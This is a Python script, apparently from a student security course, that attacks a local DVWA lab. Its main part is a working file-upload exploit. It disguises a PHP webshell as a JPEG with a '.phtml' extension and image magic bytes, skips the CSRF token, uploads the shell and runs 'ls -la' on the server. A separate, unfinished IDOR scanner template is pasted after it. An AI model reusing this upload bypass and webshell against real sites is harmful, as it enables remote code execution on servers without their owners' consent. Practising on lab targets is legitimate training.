import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re 

# --- CONFIGURATION ---
BASE_URL = "http://host.docker.internal:8084" # Use your port
UPLOAD_TEST_URL = f"{BASE_URL}/vulnerabilities/upload/"
UPLOAD_DIRECTORY = f"{BASE_URL}/hackable/uploads/" 

# --- STEP 1: PASTE YOUR COOKIE HERE ---
# Paste the 'PHPSESSID' value you copied from your browser
YOUR_COOKIE_VALUE = "a24921haem2i09g35rsk9t3a20"
# ---

# THE FIX: Using the .phtml extension bypass.
WEBSHELL_NAME = "vaani_shell.phtml" 
# Prepend the JPEG magic number (FF D8 FF E0) to bypass the image check
JPEG_HEADER = b'\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01'
WEBSHELL_CONTENT = JPEG_HEADER + b'<?php echo "WEEKS_DONE"; system("ls -la"); ?>'

# Create a session object to handle cookies
session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})

# --- MANUAL COOKIE SETUP ---
session.cookies.set('security', 'low')
session.cookies.set('PHPSESSID', YOUR_COOKIE_VALUE)
print("[*] Manual cookies have been set.")
# --- END OF COOKIE METHOD ---


def test_file_upload(url):
    """
    Tests the Insecure File Upload page using the most reliable bypass methods.
    """
    print(f"\n[+] Testing page: {url}")
    
    try:
        # 1. Get the page (only to check login status)
        response = session.get(url) 
        
        if "login.php" in response.url:
            print("[!] FAILED. Server redirected to login.php. Your cookie might be wrong or expired.")
            return

        print("[+] Success! Got the File Upload test page.")
        
        # 2. Build the files payload
        files = {
            # Use the correct file name and MIME type for JPEG to trick the server
            'uploaded': (WEBSHELL_NAME, WEBSHELL_CONTENT, 'image/jpeg') 
        }
        
        # 3. Build the form data - IGNORING THE user_token
        data = {
            'MAX_FILE_SIZE': '100000',
            'Upload': 'Upload',
        }
        
        # 4. Submit the upload
        print(f"[*] Submitting malicious file: {WEBSHELL_NAME}")
        upload_response = session.post(url, files=files, data=data)
        
        # 5. Verify upload success (DVWA usually says "has been uploaded")
        if "has been uploaded" not in upload_response.text:
            print("[!] Upload FAILED. Server rejected the file.")
            # Check for common failure messages
            if "Image files only" in upload_response.text:
                 print("[!] Secondary check: Failed image/extension check.")
            return
            
        print("[+] File uploaded successfully. Checking for execution...")
        
        # 6. Check if the webshell executes (The final proof)
        webshell_url = urljoin(UPLOAD_DIRECTORY, WEBSHELL_NAME)
        print(f"[*] Accessing webshell at: {webshell_url}")
        
        shell_response = session.get(webshell_url)
        
        # 7. Check if our unique string and 'index.php' are in the response
        if "WEEKS_DONE" in shell_response.text and "index.php" in shell_response.text:
            print(f"    [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]")
            print(f"    [!!!] FILE UPLOAD VULNERABILITY FOUND [!!!]")
            print(f"    [+] Webshell executed successfully on the server.")
            print(f"    [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]")
        else:
            print(f"    [!] Webshell failed to execute or was not found.")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] ERROR: Could not complete test. Error: {e}")


# --- MAIN EXECUTION ---
if __name__ == "__main__":
    
    if YOUR_COOKIE_VALUE == "PASTE_YOUR_COOKIE_HERE":
        print("[!] ERROR: Please paste your PHPSESSID cookie into the script on line 16.")
    else:
        print(f"\n--- STARTING FILE UPLOAD SCAN ON {UPLOAD_TEST_URL} ---")
        
        # Call the test
        test_file_upload(UPLOAD_TEST_URL)
        
        print("\n--- CRAWL FINISHED ---")

        # week6_scanner.py

# --- Put all your imports here ---
# e.g., import requests
# from bs4 import BeautifulSoup
# ...

# This is the function week7_scanner is looking for
def scan(target_url):
    """
    Runs the Access Control & IDOR scan and returns a list of findings.
    """
    print(f"Scanning {target_url} for Access Control/IDOR issues...")

    # This list will hold all the vulnerabilities you find
    findings = []

    # ==========================================================
    # ===> PUT YOUR WEEK 6 SCANNING LOGIC HERE <===
    #
    # All of your code from the old week6_scanner.py
    # goes here, and it must be indented.
    # (e.g., your code to try and access URLs or
    # objects you shouldn't have access to)
    #
    # ==========================================================


    # --- THIS IS THE IMPORTANT CHANGE ---
    # Find the part of your code where you check if a vulnerability was found.
    # Instead of just printing, do this:
    
    # PSEUDO-CODE: Replace this with your real check
    #if you_find_an_idor_or_access_control_vulnerability:
        #print("IDOR vulnerability found!") # You can keep your print
        
        # Create the dictionary
       # vulnerability = {
        #    "type": "Insecure Direct Object Reference (IDOR)",
        #    "endpoint": "http://example.com/profile?user_id=124", # The URL you tested
         #   "severity": "High",
        #    "mitigation": "Validate that the authenticated user is authorized to access the requested object."
       # }
        # Add the dictionary to the 'findings' list
        #findings.append(vulnerability)

    # At the very end of your function, return the list
    return findings


# This part goes at the VERY BOTTOM, with NO indentation.
# This lets you still run 'python week6_scanner.py' to test it.
if __name__ == "__main__":
    
    test_url = "http://127.0.0.1/dvwa" # Change this to your test URL
    
    results = scan(test_url)
    
    if results:
        print("Vulnerabilities found:")
        for res in results:
            print(res)
    else:
        print("No vulnerabilities found.")
